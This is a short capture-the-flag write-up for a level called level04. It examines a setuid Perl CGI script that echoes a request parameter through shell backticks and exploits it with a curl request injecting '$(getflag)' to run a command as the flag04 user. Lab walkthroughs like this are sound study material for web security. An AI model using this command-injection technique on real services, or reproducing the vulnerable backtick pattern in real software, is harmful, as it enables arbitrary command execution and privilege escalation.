Doing a ls -l command in the level04 user directory displays one file!

	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

It's a perl script file, with flag04's permissions. So it seems that again, we won't
actually need to connect to the flag04 account. Let's see what its code looks like!

	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
  		$y = $_[0];
  		print `echo $y 2>&1`;
	}
	x(param("x"));

The code is pretty clear, there's a function called "x" that echoes its argument, and
the script basically runs the function x with the parameter called x. Let's do a test:

	curl 192.168.0.37:4747?x=test

displays "test", just as expected.
After some research, I come up with a way to make it echo what I want: we can run getflag
in a subshell, and pass it as the x parameter!

	curl '192.168.0.37:4747?x=$(getflag)'

The program must first determine what getflag outputs - since level04.pl is launched as
flag04, getflag will also have the correct rights. Then the perl scriptt will simply
echo the output of the getflag command!
